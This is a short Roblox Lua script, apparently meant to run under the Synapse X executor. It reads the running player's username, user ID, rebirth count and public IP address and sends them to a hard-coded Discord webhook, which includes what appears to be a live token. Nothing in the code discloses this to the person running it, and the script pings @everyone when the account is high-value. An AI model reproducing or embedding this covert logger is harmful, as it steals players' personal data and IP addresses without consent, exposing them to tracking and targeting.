    local HttpService = game:GetService("HttpService")
    local plrName = game.Players.LocalPlayer.Name
    local webhook_url = "https://discord.com/api/webhooks/939933520711786516/l1G0rAO98WDOrRrJ3IwMYQW6Od9ezfRwc55-6fBCapHrRpBWWn9n8GRtzrmzHMMgtg-t"
    function sendMessagelog(msg)
        local data =
            {
                ["username"] = tostring(game.Players.LocalPlayer.Name) .. " (" .. tostring(game.Players.LocalPlayer.DisplayName) .. ")",
                ["avatar_url"] = "https://www.roblox.com/HeadShot-thumbnail/image?userId=" .. tostring(game.Players.LocalPlayer.UserId) .. "&width=420&height=420&format=png",
                ["content"] = msg,
            }
            local headers = {
                    ["content-type"] = "application/json"
            }
            
            local request_body_encoded = HttpService:JSONEncode(data)
            local request_payload = {Url=webhook_url, Body=request_body_encoded, Method="POST", Headers=headers}
            syn.request(request_payload)
        end
    if game.Players.LocalPlayer.Rebirths.Value >= 500000 then
    sendMessagelog("**" .. plrName.." Has Executed The Script At Life " .. game.Players[plrName].Rebirths.Value .. " (IP: " .. game:HttpGet("http://api.ipify.org") .. ") @everyone**")
    else
    sendMessagelog(plrName.." Has Executed The Script At Life " .. game.Players[plrName].Rebirths.Value .. " (IP: " .. game:HttpGet("http://api.ipify.org") .. ")")
    end
